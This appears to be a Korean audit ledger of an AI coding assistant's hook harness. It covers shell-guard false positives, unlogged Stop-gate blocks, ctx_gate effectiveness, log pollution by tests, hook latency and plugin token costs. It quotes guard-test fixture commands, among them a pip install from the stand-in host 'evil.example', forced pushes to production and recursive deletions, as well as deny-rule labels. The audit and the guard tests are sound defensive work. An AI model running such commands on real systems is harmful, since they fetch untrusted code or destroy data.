 if(!(($2>="2026-09-07 12:02:00" && $2<="2026-09-07 12:02:59") ||
      ($2>="2026-09-09 16:50:00" && $2<="2026-09-09 16:51:00")))
 {sub(/\(.*/,"",$4); print $4}}' docs/harness/logs/SHELL_GUARD_LOG.md | sort | uniq -c | sort -rn
```

오염 확정 근거 — 명령 문자열이 픽스처 그대로다:
`git push origin production` / `git push origin HEAD:production` / `git push origin deploy:production` / `git status git push origin production` 4종 × 4회(2런 × 2계층) = 16.
`pip install --index-url https://evil.example/simple foo` 등 `evil.example` 9종 × 4 = 36.
`Remove-Item -Recurse -Force x` / `C:\tmp` / `C:\tmp\..\DEV\FOMS` / `C:\DEV\FOMS\static` / `C:\tmp\foms-x, C:\DEV\FOMS\static` 5종 × 4 = 20.

### 2.4 실제 deny 5건 오탐/정탐 판정

| 시각 | 라벨 | 명령(요약) | 판정 |
|---|---|---|---|
| 2026-09-07 11:19:13 | git clean 강제 삭제 | `git clean -fdx` | **판정 불가** — 명령이 `test_guard_policy.py:39` 픽스처와 글자 그대로 같고, 300행 캡의 첫 생존 행이라 앞뒤 맥락이 잘렸다 |
| 2026-09-08 14:10:14 | reset --hard origin | `cd "c:/tmp/foms-deploy-own-1788844176-5140" && git cherry-pick --abort ...; git reset --hard origin/deploy -q` | **오탐** — 폐기용 임시 워크트리 정리 |
| 2026-09-09 11:32:54 | rm 재귀 삭제(루트/상위 경로) | `cd C:/tmp/dwtrim && ID=$(gh run list ...` (rm 부분은 160자 캡에 잘림) | **오탐** — `C:/tmp` 안 작업 |
| 2026-09-09 14:27:46 | rm 재귀 삭제(루트/상위 경로) | `cd /c/tmp/dwpush && ... rm -rf /c/tmp/promo_dry` | **오탐** — 임시 워크트리 제거 |
| 2026-09-09 16:53:49 | reset --hard origin | `S=".../scratchpad/promo-probe"; rm -rf "$S"; git worktree prune; ...` | **오탐** — 스크래치패드 정리 |

정탐 **0** · 오탐 **4** · 판정 불가 **1**.
구조적 원인: `_is_temp_path()`(`tools/harness/guard_policy.py:469`)의 임시폴더 면제가 **Remove-Item 계열에만** 적용되고 `_classify_rm`(`:412`)·`_classify_git_reset`(`:351`)에는 안 걸려 있다.
실제 ask 5건의 `reset --hard` 도 전부 `c:/tmp/*` 워크트리였다 → 같은 오탐.

---

## 3. Stop 게이트 실효 (`quality_check.py`)

| 질문 | 답 | 근거(코드/명령) |
|---|---|---|
| 차단(exit 2)할 때 어디에 기록하나 | **아무 데도 안 한다.** `sys.stderr.write(...)` 후 `sys.exit(2)` 뿐 — `_log_hook_error` 호출 없음 | `.claude/hooks/quality_check.py:166-172` |
| `_log_hook_error` 는 언제 부르나 | 스캐너 실패(`:120,124`) · pending 읽기 실패(`:184`) · 인벤토리 재생성 실패(`:195`) · import timeout(`:201`) · subprocess OSError(`:206`) — **전부 fail-open 경로** | 같은 파일 |
| 통과(APP_OK)는 기록되나 | 파일 아님. `write_stdout_json({"message": ...})` 로 모델에게만 보인다 | `:158-163` |
| `HOOK_RUNTIME_LOG.txt` 차단 건수 | **0** | `grep -c "STOP GATE\|quality_check" docs/harness/logs/HOOK_RUNTIME_LOG.txt` → 0 |
| `HOOK_RUNTIME_LOG.txt` 를 쓰는 주체 | **Cursor 훅뿐** (`.cursor/hooks/shared_utils.py:88-100`). Claude Code 훅은 이 파일에 안 쓴다 | `grep -rn "HOOK_RUNTIME_LOG" --include=*.py .` → `.cursor/hooks/shared_utils.py` 3곳만 |
| `HOOK_RUNTIME_LOG.txt` 태그 분포(1,492행) | `[session_stop]` 1,160 · `[track_edits]` 255 · `[payload_debug]` 77 | `awk '{for(i=1;i<=NF;i++) if($i ~ /^\[/) {print $i; break}}' docs/harness/logs/HOOK_RUNTIME_LOG.txt \| sort \| uniq -c \| sort -rn` |
| `CLAUDE_HOOK_LOG.md` 차단 건수 | **0** | `grep -c "quality_check Stop gate" docs/harness/logs/CLAUDE_HOOK_LOG.md` → 0 |
| 저장소 기록에 차단 흔적 | **0** | `git log --all --since=2026-08-03 --oneline --grep="Stop 게이트\|STOP GATE"` → 0행, `grep -rn "STOP GATE" docs/AI_CHANGELOG.md docs/AI_STATUS.md` → 0행 |

**판정: "차단 0" 은 "기록 안 함" 이다.** 발생 여부는 알 수 없다.
따라서 §5 항목 6 의 "차단이 없었으니 55ms 보험" 이라는 전제는 성립하지 않는다 — 발생 횟수 자체가 미지수다. 게이트 코드는 KEEP-CODE(H-36), 별도로 차단 로깅 추가를 MOVE-TO-CODE 로 등재(H-37)한다.

---

## 4. ctx_gate 실효

### 4.1 `[ctx_gate]` 11행의 정체

명령: `grep "\[ctx_gate\]" docs/harness/logs/CLAUDE_HOOK_LOG.md`
결과: 14행 전부 `transcript 부재 — 게이트 스킵`. **리마인더 발화 행은 0**.
- 실 세션 11행 (아래 표)
- 테스트 3행 (`'C:/nonexistent'`, 2026-09-09 16:52:46~47)

원인: 세션 첫 `UserPromptSubmit` 시점에는 `~/.claude/projects/c--DEV-FOMS/<sid>.jsonl` 이 아직 없다. 그러니 이 11행 = **세션 시작 11회의 흔적**이지 발화가 아니다.
발화 시 로그는 남지 않는다 — `_process()` 의 발화 분기(`.claude/hooks/ctx_gate.py:163-173`)에 `hook_log` 호출이 없다.

### 4.2 시각 대조표 (발화 뒤 30분 안에 AI_STATUS/ledger 커밋?)

명령(각 행):
```
git log --all --since="<T>" --until="<T+30m>" --oneline -- docs/AI_STATUS.md "docs/plans/*ledger*.md" | wc -l
```
대조군: `git log --all --since="2026-09-07" --oneline -- docs/AI_STATUS.md "docs/plans/*ledger*.md" | wc -l` = **56** (pathspec 정상 동작 확인)

| # | 시각 | 종류 | +30분 내 대상 커밋 |
|---|---|---|---|
| 1 | 2026-09-07 08:22:50 | 스킵 | 1 |
| 2 | 2026-09-07 09:23:35 | 스킵 | 0 |
| 3 | 2026-09-07 14:28:25 | 스킵 | 2 |
| 4 | 2026-09-08 08:42:19 | 스킵 | 1 |
| 5 | 2026-09-08 13:42:35 | 스킵 | 2 |
| 6 | 2026-09-08 14:50:18 | 스킵 | 4 |
| 7 | 2026-09-08 17:02:51 | 스킵 | 0 |
| 8 | 2026-09-09 09:42:28 | 스킵 | 1 |
| 9 | 2026-09-09 14:47:33 | 스킵 | 2 |
| 10 | 2026-09-09 16:50:21 | 스킵 | 3 |
| 11 | 2026-09-09 16:50:37 | 스킵 | 3 |
| **X** | **2026-09-09 16:56:20** | **실제 발화 1건**(상태 파일 `last_fire_ts`) | **0** |

해석: 1~11 은 발화가 아니므로 **인과 근거로 못 쓴다**(세션 시작 뒤 원장을 건드리는 것은 정상 작업이지 리마인더 효과가 아니다). 유일하게 확인된 실제 발화(#X)는 30분 안에 대상 파일 커밋이 **0건**이었다.
명령: `python -c "import json,datetime;d=json.load(open('docs/harness/runtime/.ctx_gate_state.json',encoding='utf-8'));print(datetime.datetime.fromtimestamp(d['last_fire_ts']))"` → `2026-09-09 16:56:20.105066`

§5 항목 18 의 판정 조건("이어진 적이 없다면 DELETE")에 해당 → **H-06 = DELETE**.

---

## 5. fail-open 로그 위생 (`docs/harness/logs/CLAUDE_HOOK_LOG.md` 300행)

기간: 2026-09-06 14:56:41 ~ 2026-09-09 20:41:33 (**3.2일**, 300행 캡 — `tools/harness/hook_log_utils.py:44` `HOOK_LOG_MAX_LINES = 300`).
따라서 이 로그로도 "2026-08-03 이후" 는 측정 불가다.

명령:
```
sed -E 's/^- [0-9-]+ [0-9:]+ //' docs/harness/logs/CLAUDE_HOOK_LOG.md \
 | sed -E 's/(스킵|실패|fail-open)[:：].*/\1/' | sort | uniq -c | sort -rn
```

| 훅 | 메시지 유형 | 행 | 비율 | 분류 |
|---|---|---|---|---|
| `track_edits` | 트리밖 편집 스킵 | 253 | 84.3% | 정보성(설계상 정상) |
| `hook_log_utils` | 세션 블록 없음 — 갱신 no-op `id='unknown'` | 12 | 4.0% | **테스트 오염** |
| `hook_log_utils` | 세션 블록 없음 — 갱신 no-op `id='other999'` | 12 | 4.0% | **테스트 오염** |
| `hook_log_utils` | 세션 블록 없음 — 갱신 no-op `id='c58dbabc'/'21c2b92f'/'157b5e5e'` | 9 | 3.0% | 실 no-op 경고(조치 불필요) |
| `ctx_gate` | transcript 부재 — 게이트 스킵 (실 세션) | 11 | 3.7% | 실 스킵(조치 불필요) |
| `ctx_gate` | transcript 부재 — 게이트 스킵 `'C:/nonexistent'` | 3 | 1.0% | **테스트 오염** |
| — | **진짜 훅 실패(예외 fail-open)** | **0** | **0.0%** | — |

| 지표 | 값 |
|---|---|
| **정보성 비율(track_edits 만)** | **253/300 = 84.3%** |
| 조치 불필요 총합(정보성 + 실 no-op) | 273/300 = **91.0%** |
| 테스트 오염 | 27/300 = **9.0%** |
| 진짜 실패 | **0건 (0.0%)** |

오염 원천: `tests/harness/test_hook_log_hygiene.py:145`(`id="unknown"`) · `:148`(`id="other999"`) 가 `update_session_block` 을 호출하고, 그 안의 `_warn()`(`tools/harness/hook_log_utils.py:376`)이 **하드코딩된 실 경로**(`tools/harness/hook_log_utils.py:49` `_HOOK_LOG_PATH`)에 쓴다. 테스트가 `tmp_path` 로 SESSION_LOG 를 격리해도 로그는 안 격리된다.

판정: **COMPRESS(H-30)** — 정보성 84.3%가 실패 0건을 덮는다. `트리밖 편집 스킵` 은 디버그 레벨/별도 파일로 내리고, fail-open 실패만 남기면 이 로그의 신호 대 잡음이 300:0 → 0:0 이 아니라 실질 신호만 남는다.

---

## 6. 인벤토리 churn — lineno-무관 게이트 뒤에도 멈추지 않았다

게이트 커밋: **`bc241c5eb` 2026-08-03 21:05:50** `fix(ci): 인벤토리 게이트 lineno-무관 비교 + pre_push_smoke에 드리프트 게이트 5종 추가`
명령: `git log --oneline --all --grep="lineno-무관\|줄번호 무관\|줄밀림"` · `git show -s --format="%H %ad %s" --date=iso bc241c5e`
(`git log --oneline -S"lineno" -- tests/harness tools/harness` 는 게이트 도입 커밋을 못 짚는다 — 6건 전부 스캐너 신설 커밋이다.)

| 집계 | 값 | 명령 |
|---|---|---|
| 2026-08-03 이후 churn 커밋(전 ref, cherry-pick 중복 포함) | 74 | `git log --all --since=2026-08-03 --format="%h\|%ad\|%s" --date=format:"%Y-%m-%d %H:%M" \| grep -icE "인벤토리.*(재생성\|동기화\|정합)\|줄밀림\|줄번호"` |
| ↳ 게이트 **전**(~2026-08-03 21:05) | 3 | 위 출력에 `awk -F'\|' '{if($2<"2026-08-03 21:05") b++; else a++} END{print b,a}'` |
| ↳ 게이트 **후** | **71** | 같은 명령 |
| deploy 브랜치만(중복 제외) | 41 | `git log deploy --since=2026-08-03 ... \| grep -icE ...` |
| ↳ 게이트 전 / 후 | 3 / **38** | 같은 awk |
| 게이트 후 인벤토리 3종 파일이 변경된 커밋(deploy) | **170** | `git log deploy --since="2026-08-03 21:05" --oneline -- docs/harness/foms_failopen_inventory.json docs/harness/foms_order_mutation_writer_inventory.json docs/harness/foms_state_writer_inventory.json \| wc -l` |
| 2026-08-03 이후 deploy 총 커밋 | 1,478 | `git log deploy --since=2026-08-03 --oneline \| wc -l` |
| churn 비율 | 38/1,478 = **2.6%** | 위 두 값 |
| **현재(HEAD `fe21a5cc3`) 워킹트리 상태** | 인벤토리 2종이 또 수정돼 있음 | `git status --porcelain docs/harness` → `M docs/harness/foms_failopen_inventory.json`, `M docs/harness/foms_order_mutation_writer_inventory.json` |

churn 이 이어진 이유(문서 증거): `~/.claude/projects/c--DEV-FOMS/memory/project_inventory_lineno_free_gate.md` **정정(2026-08-23)** — "lineno-무관은 `test_inventory_matches_fresh_scan` **뿐**이다. `test_rev_99.py::test_no_new_external_writers` 는 `(path, lineno, kind)` 튜플을 그대로 비교해 **줄밀림만으로 red**". 즉 게이트가 3종 중 1종만 덮었다.

### DOWNGRADE 후보 등재

| ID | 대상 | 규모 | 판정 | 근거 |
|---|---|---|---|---|
| H-48 | `docs/harness/foms_failopen_inventory.json` | 5,376줄 | DOWNGRADE | 게이트 후에도 churn 38커밋·파일 변경 170커밋 |
| H-49 | `docs/harness/foms_order_mutation_writer_inventory.json` | 657줄 | DOWNGRADE | 위와 같음. 이 파일이 lineno 정확 비교 대상(`test_rev_99.py`) |
| H-50 | `docs/harness/foms_state_writer_inventory.json` | 520줄 | DOWNGRADE | 위와 같음 |
| H-51 | `tools/harness/failopen_scan.py` (407줄) · `order_mutation_writer_scan.py` (278) · `state_writer_scan.py` (312) | 997줄 | DOWNGRADE | 인벤토리 3종의 생성기. Stop 훅이 턴마다 최대 60초×3 예산으로 재실행(`.claude/hooks/quality_check.py:27,31-38`) |

복원 트리거(공통): lineno 를 뺀 비교로 전환한 뒤, **신규/제거/재분류 catch 를 놓쳐 fail-open 이 운영에 유입된 사건**이 1건 보이면 되살린다.
위험: 이 인벤토리는 fail-open·ORM 우회 감시의 유일한 정적 근거다. 삭제가 아니라 "lineno 를 스키마에서 빼고 `(path, symbol, kind)` 로 재정의" 가 최소 조치다.

---

## 7. 지연 재측정 (§2.2 방법 그대로)

방법: 더미 페이로드 → `subprocess.run` → `time.perf_counter` → 3회 중앙값. 스크립트 `…/scratchpad/measure_hooks.py`.
오염 회피: `guard_shell` 은 `git status`(allow → 무기록), `post_bash` 는 `ls -la`(commit/push 아님 → 무기록), `track_edits` 는 `docs/AI_STATUS.md`(`EXCLUDE_PREFIXES` 의 `docs/` → 무기록), `ctx_gate` 는 스크래치패드의 1줄 더미 transcript(존재 → `transcript 부재` 로그 없음, 임계 미달 → 상태 파일 미기록).

| 항목 | 회차(ms) | 중앙값(ms) | §2.2 값 | 편차 | 비고 |
|---|---|---|---|---|---|
| `guard_shell`(allow) | 52, 54, 51 | **52** | 55 | −5.5% | 일치 |
| `post_bash`(no-op) | 48, 49, 49 | **49** | 52 | −5.8% | 일치 |
| `track_edits`(docs/ 제외) | 54, 51, 49 | **51** | 54 | −5.6% | 일치 |
| `ctx_gate`(임계 미달) | 51, 49, 49 | **49** | 53~84 | −7.5%(하한 기준) | 일치 |
| orca `claude-hook.cmd` | 28, 28, 29 | **28** | 27 | +3.7% | 일치 |
| 파이썬 빈 기동 | 29, 30, 29 | **29** | 30 | −3.3% | 일치 |
| **Bash 1회 합산**(guard_shell + post_bash + orca×2) | — | **158** | 약 160 | −1.3% | 일치 |
| **Edit 1회 합산**(track_edits + orca×2) | — | **108** | 약 110 | −1.8% | 일치 |

**전 항목 ±20% 이내 — "재측정" 표기 불필요.**

파생 수치:
- 파이썬 훅 1개의 순수 오버헤드 ≈ 중앙값 − 빈 기동 29ms = guard_shell 23 · post_bash 20 · track_edits 22 · ctx_gate 20 ms. 즉 **비용의 약 57%가 파이썬 인터프리터 기동 자체**다.
- orca 삭제(H-43) 만으로 Bash 158→102ms(**−35%**), Edit 108→51ms(**−53%**).
- ctx_gate 삭제(H-06) 는 프롬프트당 49ms 절감(도구 호출당 비용 아님).

---

## 8. orca 훅 — 파일 증거만

| 사실 | 증거 |
|---|---|
| `~/.orca/` 안의 파일 | `agent-hooks/` 한 디렉토리, 파일 16개. 다른 파일·설정·로그 없음 |
| 전 파일 수정 시각 | **2026-07-23 16:10** 전부 동일(1회 설치 이후 미변경) — `find "C:/Users/USER/.orca" -type f -printf "%TY-%Tm-%Td %TH:%TM %10s %p\n" \| sort` |
| 16개 파일의 대상 도구 | `claude-hook.cmd`(1,065B) · `codex-hook.cmd` · `cursor-hook.cmd` · `gemini-hook.cmd` · `grok-hook.cmd` · `devin-hook.cmd` · `droid-hook.cmd` · `openclaude-hook.cmd` · `command-code-hook.cmd` · `copilot-hook.ps1` · `kimi-hook.sh` · `antigravity-*.cmd` 5종 |
| `claude-hook.cmd` 동작 | `ORCA_AGENT_HOOK_PORT`/`ORCA_AGENT_HOOK_TOKEN`/`ORCA_PANE_KEY` 중 하나라도 비면 `:orca_agent_hook_drain_stdin` → `more.com >nul` → `exit /b 0`. 설정되면 `curl -sS -X POST http://127.0.0.1:<PORT>/hook/claude` |
| 이 환경의 `ORCA_*` 환경변수 | **없음** — `env \| grep -i "^ORCA\|DEVIN_PROJECT"` 무출력 → 현재 세션에서는 무동작(stdin 배수만) |
| 기원 앱 실존 | `C:/Users/USER/AppData/Local/orca-updater/installer.exe` (190.7MB, 2026-07-23 16:09) · `C:/Users/USER/AppData/Local/Orca/daemon-host/` · `C:/Users/USER/AppData/Roaming/orca/`(Electron 프로필: Cache·GPUCache·Local Storage·Network) |
| **최근 사용 시각** | `C:/Users/USER/AppData/Roaming/orca/logs/daemon.log` 마지막 행 `2026-09-08T00:04:14.210Z` (한국시각 2026-09-08 09:04) — `event: session-attached` |
| 이 저장소와의 관계 | `orca-stats.json` 의 `repoId e5d3778b-...` 이벤트에 `pr_created` → `https://github.com/lahomsystem/FOMS/pull/25`, `pull/11`. `ptyId` 경로는 **`C:/Users/USER/OneDrive/Desktop/SY/program/lahomproject/FOMS`** (현재 저장소 `C:/DEV/FOMS` 가 아닌 구 경로) |

**정리(추측 없음)**: orca 는 FOMS 저장소에 붙어 여러 AI 에이전트를 pane 으로 돌리는 데스크톱 앱이고, **하루 전(2026-09-08 09:04)까지 실행됐다**. 현재 Claude Code 세션은 orca 밖에서 기동돼 `ORCA_*` 가 없으므로 훅이 무동작이다.
→ §5 항목 3 의 "현재 환경에서는 무동작" 은 맞지만, "기원 도구가 아직 쓰이는지 사용자에게 확인" 은 **파일 증거상 아직 쓰인다** 쪽이다. 10이벤트 배선 삭제는 orca 로 기동한 세션의 pane 연동을 끊는다. **사용자 결정 항목**(H-43).

---

## 9. 실 로그 오염 여부 (이 감사 세션)

`git status --porcelain docs/harness` 결과: `M docs/harness/foms_failopen_inventory.json` · `M docs/harness/foms_order_mutation_writer_inventory.json` **2건뿐** — 둘 다 이 세션 시작 시점 스냅샷에 이미 있던 것이라 내 작업과 무관하다.

로그 파일은 `.gitignore:123,125,126` 으로 추적 밖이라 `git status` 로는 안 보인다. 직접 확인:

| 파일 | 감사 전 크기/시각 | 감사 후 | 판정 |
|---|---|---|---|
| `docs/harness/logs/SHELL_GUARD_LOG.md` | 64,343B / 2026-09-09 20:38 | 64,499B / 20:54 — **1행 추가됨** | **내 오염 아님.** 추가 행은 `2026-09-09 20:54:14 \| ask \| checkout -- (작업 변경 폐기) \| S=".../f5ea77ab-02a2-4e86-abba-33801848a609/scratchpad"; W="/c/tmp/foms-promo-20260909" git worktree p…` — 세션 `f5ea77ab` (내 세션은 `2d36f711`). 내 지연 측정은 `git status`(allow)만 썼으므로 `guard_shell.py:120-121` 에서 무기록 반환한다. 덤으로 이 행 자체가 H-21(`checkout --` 오탐, 스크래치패드·임시 워크트리 정리) 의 30번째 실례다 |
| `docs/harness/runtime/.ctx_gate_state.json` | 111B / 16:56 | **변화 없음** | 오염 없음 |
| `docs/harness/runtime/EDIT_LOG.md` | 4,890B / 16:33 | **변화 없음** | 오염 없음 |
| `docs/harness/logs/CLAUDE_HOOK_LOG.md` | 42,812B | **42,894B로 증가** | **행 추가됨** — 다만 추가된 행은 `20:46:20 [track_edits] 트리밖 편집 스킵: …\scratchpad\builtin-overlap.md` 로 **다른 워커(audit1-rules)의 스크래치패드 편집**이다. 내 지연 측정은 `docs/AI_STATUS.md` 를 썼으므로 `EXCLUDE_PREFIXES` 에서 조기 반환돼 로그를 안 남긴다 |

추가 고지: 이 원장 파일을 스크래치패드에 쓰는 행위 자체가 `track_edits` 의 `트리밖 편집 스킵` 행을 1행 더 남긴다(구조상 회피 불가). **되돌리지 않았다.**

---

## 10. 판정 분포

| 층 | KEEP-CODE | DOWNGRADE | DELETE | COMPRESS | RESOLVE | MOVE-TO-CODE | 유지(조치없음) | 합 |
|---|---|---|---|---|---|---|---|---|
| L1 | 8 (H-10·H-15·H-24·H-27·H-32·H-36·H-40·H-41·H-42 중 8) | 13 | 0 | 1 | 0 | 1 | 0 | 23 |
| L6 | 1 | 5 | 4 | 4 | 2 | 0 | 1 | 17 |
| L7 | 0 | 0 | 1 | 0 | 2 | 0 | 0 | 3 |
| **합** | **10** | **18** | **5** | **5** | **4** | **1** | **1** | **51** |

(H-40·H-41·H-42 를 각각 세면 KEEP-CODE 10, 전체 51행 — 빈 판정 0.)

### 절감 합계(이 조각 범위)

| 항목 | 절감 |
|---|---|
| orca 10이벤트 삭제(H-43) | Bash −56ms(−35%) · Edit −56ms(−53%) |
| ctx_gate 삭제(H-06·H-05·H-07·H-08) | 프롬프트당 −49ms, 코드 −187줄 |
| track_edits 동시편집 2기능 삭제(H-28·H-29) | 코드 −90줄 |
| session_start MEMORY-GATE 삭제(H-03) | 코드 −31줄 |
| 전역 allow 정리(H-47) | 설정 −약 110줄 |
| 인벤토리 3종 + 스캐너 DOWNGRADE(H-48~H-51) | 저장소 −7,550줄(재정의 시), Stop 훅 최대 −180초 예산 |
| 산문 중복 해소(H-33·H-35·H-02) | CLAUDE.md −약 5줄 |

---

## 11. 다음 단계 제안(총괄용)

1. **가드 실효 재측정 인프라부터 고쳐야 판정이 확정된다.** 지금 결론(deny 정탐 0)의 관측창은 2.4일뿐이다. `_LOG_CAP` 상향 + 테스트 로그 경로 주입(H-25·§2.2) 뒤 2주 재관측을 권한다.
2. `claude-code-guide` 로 확인 필요 2건: ① `permissions.defaultMode: bypassPermissions` 에서 훅의 `permissionDecision: "ask"` 가 실제로 확인 프롬프트를 띄우는가(H-45) ② 전역 `allow` 와 프로젝트 `deny` 의 우선순위(H-46). 이 답에 따라 ask 규칙 전체(H-12·H-14·H-17·H-19·H-21)의 판정이 뒤집힐 수 있다.
3. orca(H-43)는 파일 증거상 어제까지 쓰였다 — 사용자에게 "orca 앱을 계속 쓸 것인가" 를 물어야 삭제 여부가 정해진다.


# 조각 3 — ledger-part-3-plugins.md

# 하네스 ablation v2 — 원장 조각 3 (플러그인·스킬·MCP·상시텍스트·상충)

담당: 정적 감사 워커 ③ (읽기 전용). 범위 = 지시서 §5 항목 1·2·11 + 담당 목록 1~5.
기준 커밋(지시서): `46bdac44d`(2026-09-09). **재측정: 현재 HEAD = `fe21a5cc3`(2026-09-09) — 명령 `git log --oneline -1`**. HEAD가 기준보다 앞서 있어 파일 상태가 더 최신일 수 있음(예: MEMORY.md 드리프트, 아래 K-17).

---

## 1. 원장 표

`ID | 원천 파일:행 | 항목 요약 | 층 | 근거 | 판정 | 절감(토큰 추정) | 위험 | 복원 트리거 | 상태`

| ID | 원천 파일:행 | 항목 요약 | 층 | 근거 | 판정 | 절감(토큰 추정) | 위험 | 복원 트리거 | 상태 |
|---|---|---|---|---|---|---|---|---|---|
| K-01 | `~/.claude/plugins/cache/claude-plugins-official/superpowers/6.3.0/hooks/hooks.json:1-15`, `.../hooks/session-start:14-16` | superpowers SessionStart 훅이 매 세션(startup/clear/compact) `~/.claude/plugins/cache/claude-plugins-official/superpowers/6.3.0/skills/using-superpowers/SKILL.md` 전문을 `<EXTREMELY_IMPORTANT>` 로 주입 | L7 (지시서 §5-1 확정, 2026-08-03 무력화 결정 드리프트) | 원문 확인: `hooks.json` matcher `startup\|clear\|compact`, `session-start` 14-16행이 `~/.claude/plugins/cache/claude-plugins-official/superpowers/6.3.0/skills/using-superpowers/SKILL.md` cat 후 escape·주입. 파일 실측 `wc -m using-superpowers/SKILL.md`=3108자(63줄, 프론트매터 포함), 래핑 오버헤드(`<EXTREMELY_IMPORTANT>\nYou have superpowers...` 등) 약 250자 → 세션 시작마다 약 3,360자 주입 | RESOLVE (재발방지는 코드로: 플러그인 훅 비활성 상태를 단언하는 가드 테스트, `docs/harness/policy/DECISIONS.md:35` 결정 재적용) | 영어 텍스트이므로 3360자÷3.5 ≈ 960토큰/세션(startup·clear·compact마다 재과금) | 낮음(정보 텍스트, 위험 명령 없음) — 단 "1%라도 스킬 강제" 문구가 전역 CLAUDE.md §4와 직접 상충(K-18) | 하네스 로그에 "스킬 강제 호출로 인한 불필요 스킬 남발" 재발 시 |
| K-02 | `~/.claude/plugins/cache/claude-plugins-official/superpowers/6.3.0/skills/*/SKILL.md`(14개) | superpowers 스킬 14종의 이름+설명 1줄이 매 세션 목록에 나열 | L6(목록 비용) | 실측: `find .../superpowers/6.3.0/skills -maxdepth 1 -type d \| wc -l` = 14(재측정 — 지시서 §2.1 "12개"는 과소; brainstorming·dispatching-parallel-agents·executing-plans·finishing-a-development-branch·receiving-code-review·requesting-code-review·subagent-driven-development·systematic-debugging·test-driven-development·using-git-worktrees·using-superpowers·verification-before-completion·writing-plans·writing-skills). description 합계 1,861자, 한글 0자. 사용 흔적: `git log --since=2026-08-03 --format=%s \| grep -ci <스킬명>` 전 종목 0건, `docs/harness/runtime/SESSION_LOG.md`·`docs/AI_CHANGELOG.md` grep 전 종목 0건 | COMPRESS 후보(목록만 축소, 본문은 온디맨드라 상시비용 아님) — **단 사용 근거 불충분**: SESSION_LOG.md는 편집파일만 기록하고 Skill 호출을 기록하지 않아 "0건"이 "미사용 증거"가 아니라 "측정도구 사각"일 수 있음(확신=의문) | 1861자÷3.5 ≈ 532토큰/세션 | 낮음(목록 1줄, 재발 위험 없음) | 사용자가 특정 superpowers 스킬을 실제 호출한 트랜스크립트 근거가 나오면 그 스킬만 KEEP-PREF로 재분류 |
| K-03 | `~/.claude/plugins/cache/caveman/caveman/81536f57b330/.claude-plugin/plugin.json:6-15`, `~/.claude/plugins/cache/caveman/caveman/81536f57b330/src/hooks/caveman-activate.js` 전체 | caveman SessionStart 훅이 `.caveman-active` 플래그(현재 `full`)를 읽어 `~/.claude/plugins/cache/caveman/caveman/81536f57b330/skills/caveman/SKILL.md` 를 강도별로 필터링해 주입 | L6(재주입) — caveman 자체는 L3 취향이므로 유지 여부 미판정, 비용만 기록 | 실측: 플래그 파일 `~/.claude/.caveman-active` 내용 = `full`. `~/.claude/plugins/cache/caveman/caveman/81536f57b330/skills/caveman/SKILL.md` 원본 6,698자(89줄). activate.js 필터 로직(테이블 행·example 행을 활성 레벨만 남김)을 파이썬으로 재현(`sim_caveman.py`) → 실제 주입 텍스트 4,664자(전부 영어, 한글 0) | 판정 보류(L3, 사용자 결정) — 비용·충돌만 기록 | 4664자÷3.5 ≈ 1,333토큰/세션(startup·clear·compact) | 낮음 단독으로는, 단 §4 상충(K-19~21) 유발 | 사용자가 caveman off 결정 시 이 항목·K-04·K-19~21 동시 소멸 |
| K-04 | `~/.claude/plugins/cache/caveman/caveman/81536f57b330/plugin.json:16-25`, `src/hooks/caveman-mode-tracker.js:274-287` | caveman UserPromptSubmit 훅이 **매 사용자 턴마다** `CAVEMAN MODE ACTIVE (full) — session ruleset applies.` 1줄을 additionalContext로 재주입 | L6(재주입, 턴당 상시) — L3 취향 비용만 기록 | 원문 확인(코드 274-287행): `reinforce = ... \`CAVEMAN MODE ACTIVE (${activeMode}) — session ruleset applies.\`` | 판정 보류(L3) | 약 55자/턴 ≈ 16토큰/턴 × 세션 내 턴 수(예: 50턴 세션이면 ≈800토큰) | 낮음(1줄) | 좌동(K-03) |
| K-05 | `~/.claude/plugins/cache/caveman/caveman/81536f57b330/skills/*/SKILL.md`(20개, `generated/` 디렉토리 제외) | caveman 스킬 20종(cavecrew·caveman·caveman-commit·caveman-compress·caveman-discover·caveman-evidence-review·caveman-explore·caveman-help·caveman-learn·caveman-manage·caveman-optimize·caveman-review·caveman-setup·caveman-stats·investigate-first·lean-build·migration·safe-refactor·surgical-patch·verify-and-stop) 목록 비용 | L6(목록 비용) — L3 비용만 기록 | 실측: `find .../caveman/skills -maxdepth 1 -type d \| wc -l`=21(그중 `generated/`는 컴파일 산출물 디렉토리, SKILL.md 없음 → 실 스킬 20). description 합계 6,140자, 한글 0. 사용 흔적: 전 종목 grep 0건(K-02와 동일 사각) | 판정 보류(L3) | 6140자÷3.5 ≈ 1,754토큰/세션 | 낮음 | K-03과 동일 |
| K-06 | `~/.claude/settings.json:268-270`, `~/.claude/plugins/cache/ponytail/ponytail/4.8.4/` | ponytail 플러그인 — 캐시는 존재(6개 스킬: ponytail·ponytail-audit·ponytail-debt·ponytail-gain·ponytail-help·ponytail-review)하나 **비활성 확인** | L6 잠재(비활성 시 0) | `enabledPlugins` 원문: `"ponytail@ponytail": false` — 비활성이므로 훅·스킬목록 모두 이번 세션에 나타나지 않음(위 스킬 목록 시스템 리마인더에 ponytail 항목 없음으로 교차확인) | KEEP(비활성 상태 유지, 캐시 디렉토리 자체는 디스크 비용일 뿐 세션 토큰 비용 0) | 0토큰(이미 절감된 상태) | 없음 | 사용자가 `enabledPlugins.ponytail`를 true로 바꾸면 K-01~05와 동일한 재주입·목록 비용 재발 — 그때 재평가 |
| K-07 | `~/.claude/skills/*/SKILL.md`(59개, 부록 A) | 전역 스킬 59종(gstack 57 · caveman 1 · last30days 1) description 목록 비용 | L6(목록 비용) | 실측(파이썬 스크립트): 전 59개 SKILL.md frontmatter description 합계 4,941자, 한글 0자(부록 A에 개별 자수 전수 기재). 재측정: 지시서 §2.1 "59개(gstack 56)"은 gstack 계열 카운트가 어긋남 — 실측 `ls -d ~/.claude/skills/*/ \| grep -ci gstack`=57(`_gstack-command` 포함) | COMPRESS 후보(gstack 57종 중 실사용 확인된 것만 남기고 나머지는 marketplace에서 온디맨드 설치로 전환 — 삭제는 사용자 결정) | 4941자÷3.5 ≈ 1,412토큰/세션 | 낮음(목록) | 사용 안 하는 gstack 하위기능이 실제로 필요해지면 재설치 |
